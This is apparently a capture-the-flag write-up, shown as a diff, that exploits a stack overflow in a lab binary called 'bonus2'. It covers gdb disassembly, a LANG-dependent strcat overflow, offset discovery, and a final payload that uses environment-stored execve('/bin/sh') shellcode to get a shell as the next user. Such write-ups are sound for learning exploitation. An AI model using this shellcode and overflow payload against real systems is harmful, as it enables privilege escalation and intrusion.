@@ -1,0 +1,93 @@
+- We run the program and we found that it takes 2 params, after giving it 2 params it prints the first paramter:
+
+$> ./bonus2 AAAAS BBBBBB
+Hello AAAAS
+
+- Also it checks the argc if it's 3 if not the program exit.
+
+0x08048538 <+15>:	cmp    DWORD PTR [ebp+0x8],0x3
+
+- Also it gets the content of an environment variable (LANG) and check if it "nl" or "fi" using memcmp.
+
+-> if LANG = 'fi' => language = 1
+-> if LANG = 'nl' => language = 2
+-> else it still the default value which is language = 0.
+
+- We see also that it copy the first 40 chars of argv[1] inside a variable. 
+
+   0x08048564 <+59>:	mov    DWORD PTR [esp+0x8],0x28
+   0x0804856c <+67>:	mov    DWORD PTR [esp+0x4],eax
+   0x08048570 <+71>:	lea    eax,[esp+0x50]
+   0x08048574 <+75>:	mov    DWORD PTR [esp],eax
+   0x08048577 <+78>:	call   0x80483c0 <strncpy@plt>
+
+- Also copy the first 32 chars of argv[2] inside another variable (This variable is located 40 bytes after the first variable).
+
+   0x08048584 <+91>:	mov    DWORD PTR [esp+0x8],0x20
+   0x0804858c <+99>:	mov    DWORD PTR [esp+0x4],eax
+   0x08048590 <+103>:	lea    eax,[esp+0x50]
+   0x08048594 <+107>:	add    eax,0x28
+   0x08048597 <+110>:	mov    DWORD PTR [esp],eax
+   0x0804859a <+113>:	call   0x80483c0 <strncpy@plt>
+
+- After that a call to greetuser() function. after disassembling this function we found that it calls strcat (we can overflow it). and it prints the first parameter.
+
+- we will try to overflow 1st param.
+
+(gdb) r AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+Starting program: /home/user/bonus2/bonus2 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+Hello AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+
+Program received signal SIGSEGV, Segmentation fault.
+0x08004141 in ?? ()
+
+- We see that we can't rewrite the EIP completely. for that, we tried with different LANG (fi).
+
+$> export LANG="fi"
+(gdb) r AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
+Starting program: /home/user/bonus2/bonus2 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
+Hyvää päivää AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
+
+Program received signal SIGSEGV, Segmentation fault.
+0x42424242 in ?? ()
+
+- It seems like the offset on the second parameter so we will overflow it to get the right offset.
+
+(gdb) r AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
+Starting program: /home/user/bonus2/bonus2 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
+Hyvää päivää AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab
+
+Program received signal SIGSEGV, Segmentation fault.
+0x41366141 in ?? ()
+
+- so the offset is 18, we need to export the SHELLCODE 
+
+export SHELLCODE=`python -c "print '\x90' * 500 + '\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80'"`
+
+- We need a small program to get the address of our shellcode.
+
+#include <stdio.h>
+#include <stdlib.h>
+
+int main(int argc, char **argv) {
+    printf("%s is %p\n", argv[1], getenv(argv[1]));
+}
+
+$> ./a.out SHELLCODE
+SHELLCODE is 0xbffff6ec
+
+- Now, prepare our payload:
+
+Param1: Fill the first string with 40 char.
+Param2: OFFSET + addr of our shellcode
+
+$> ./bonus2 `python -c 'print "A" * 40'`  `python -c 'print "A" * 18 + "\xec\xf6\xff\xbf"'`
+$> whoami
+bonus3
+
+
+
+
+
+
+
